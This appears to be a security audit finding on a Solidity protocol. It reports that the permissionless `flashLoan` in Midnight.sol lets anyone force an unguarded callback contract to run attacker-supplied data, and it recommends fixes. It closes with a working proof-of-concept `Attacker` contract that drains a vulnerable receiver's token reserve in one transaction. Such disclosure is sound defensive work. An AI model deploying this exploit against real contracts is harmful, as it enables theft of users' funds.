### Title
Anyone Can Trigger `flashLoan` Against an Unprotected `IFlashLoanCallback` Receiver — (File: src/Midnight.sol)

---

### Summary

The `flashLoan` function in `Midnight.sol` imposes no access control on the `callback` parameter. Any unprivileged attacker can call `flashLoan` specifying an arbitrary contract as `callback`, forcing that contract to execute its `onFlashLoan` logic with fully attacker-controlled `data`. If the target contract does not validate the `caller` argument passed by Midnight, an attacker can coerce it into executing unintended operations — including draining its own token balances or performing unauthorized approvals.

---

### Finding Description

**Root cause — no caller restriction on `flashLoan`:** [1](#0-0) 

```solidity
function flashLoan(address[] calldata tokens, uint256[] calldata assets, address callback, bytes calldata data)
    external
{
    require(tokens.length == assets.length, InconsistentInput());
    emit EventsLib.FlashLoan(msg.sender, tokens, assets, callback);
    for (uint256 i = 0; i < tokens.length; i++) {
        SafeTransferLib.safeTransfer(tokens[i], callback, assets[i]);
    }
    require(
        IFlashLoanCallback(callback).onFlashLoan(msg.sender, tokens, assets, data) == CALLBACK_SUCCESS,
        WrongFlashLoanCallbackReturnValue()
    );
    for (uint256 i = 0; i < tokens.length; i++) {
        SafeTransferLib.safeTransferFrom(tokens[i], callback, address(this), assets[i]);
    }
}
```

There is no check that `msg.sender == callback`, no whitelist, and no authorization gate. The `data` bytes are passed verbatim to the victim.

**The `IFlashLoanCallback` interface:** [2](#0-1) 

The `caller` field in `onFlashLoan(address caller, ...)` is the only signal a receiver has to identify who initiated the loan. If the receiver does not validate it, the attacker's address is silently accepted.

**Exploit flow:**

1. Attacker calls `Midnight.flashLoan([token], [amount], victimContract, maliciousData)`.
2. Midnight transfers `amount` of `token` from its own balance to `victimContract`.
3. Midnight calls `victimContract.onFlashLoan(attacker, [token], [amount], maliciousData)`.
4. `victimContract` does not check `caller`; it decodes `maliciousData` and executes attacker-directed logic (e.g., approves a spender, transfers its own reserve tokens, executes a trade at a bad price).
5. Midnight pulls `amount` back from `victimContract` via `safeTransferFrom` — which succeeds because `victimContract` pre-approved Midnight (standard pattern for flash loan receivers).
6. Net result: Midnight's balance is unchanged; `victimContract`'s own funds have been manipulated or drained by the attacker-controlled callback.

---

### Impact Explanation

Any contract that:
- implements `IFlashLoanCallback`,
- has granted Midnight a token allowance (required for repayment), and
- does not validate `caller` inside `onFlashLoan`

…can be forced to execute arbitrary logic with attacker-supplied `data`. Concrete outcomes include:

- **Token drain**: if the callback transfers its own reserve tokens based on `data`.
- **Unauthorized approval**: if the callback issues `approve()` calls based on `data`.
- **Forced trade execution**: if the callback re-enters Midnight's `take`/`repay` on behalf of the victim.

The protocol's own balance is unaffected; the loss falls entirely on the victim contract.

---

### Likelihood Explanation

- **Attacker preconditions**: none — `flashLoan` is fully permissionless.
- **Victim preconditions**: the victim must implement `IFlashLoanCallback`, have a Midnight allowance, and omit a `caller` check. This is a realistic pattern for flash-loan executor or router contracts that pre-approve Midnight and use `data` to parameterize their logic.
- **No fees** are charged in Midnight's flash loan (unlike Aave), so the "fee drain" sub-variant does not apply, but the forced-callback-execution variant is identical.

---

### Recommendation

**Option A (strongest):** Require that only the callback itself can initiate a flash loan targeting itself:

```solidity
require(msg.sender == callback, UnauthorizedFlashLoanInitiator());
```

**Option B (design-preserving):** Add prominent NatSpec documentation on `flashLoan` and `IFlashLoanCallback` warning that any implementation **must** validate `caller == address(midnight)` AND that the initiator is a trusted address, with a reference sample:

```solidity
function onFlashLoan(address caller, ...) external returns (bytes32) {
    require(msg.sender == address(midnight), NotMidnight());
    require(caller == trustedInitiator, UntrustedCaller());
    ...
}
```

### Proof of Concept

```solidity
// VulnerableReceiver — does not check caller
contract VulnerableReceiver is IFlashLoanCallback {
    address public midnight;
    IERC20 public token;

    constructor(address _midnight, address _token) {
        midnight = _midnight;
        token = IERC20(_token);
        // Pre-approve Midnight (standard pattern)
        token.approve(_midnight, type(uint256).max);
    }

    function onFlashLoan(
        address /*caller*/,   // ← never validated
        address[] memory,
        uint256[] memory,
        bytes memory data
    ) external returns (bytes32) {
        // Executes attacker-supplied instructions
        (address target, bytes memory call) = abi.decode(data, (address, bytes));
        (bool ok,) = target.call(call);
        require(ok);
        return CALLBACK_SUCCESS;
    }

    // Holds its own reserve of `token`
    function deposit(uint256 amount) external {
        token.transferFrom(msg.sender, address(this), amount);
    }
}

// Attack
contract Attacker {
    function attack(address midnight, address victim, address token, uint256 amount) external {
        address[] memory tokens = new address[](1);
        tokens[0] = token;
        uint256[] memory assets = new uint256[](1);
        assets[0] = amount;

        // Encode a call that transfers victim's OWN reserve to attacker
        bytes memory innerCall = abi.encodeCall(
            IERC20.transfer, (address(this), IERC20(token).balanceOf(victim))
        );
        bytes memory data = abi.encode(token, innerCall);

        // Anyone can call this — no authorization required
        IMidnight(midnight).flashLoan(tokens, assets, victim, data);
        // victim's reserve is now in attacker's wallet
    }
}
```

**Expected outcome**: `VulnerableReceiver`'s entire token reserve is transferred to the attacker. Midnight's balance is unchanged (it received back the flash-loaned `amount`). The attack requires zero privileges and a single transaction. [1](#0-0) [2](#0-1)
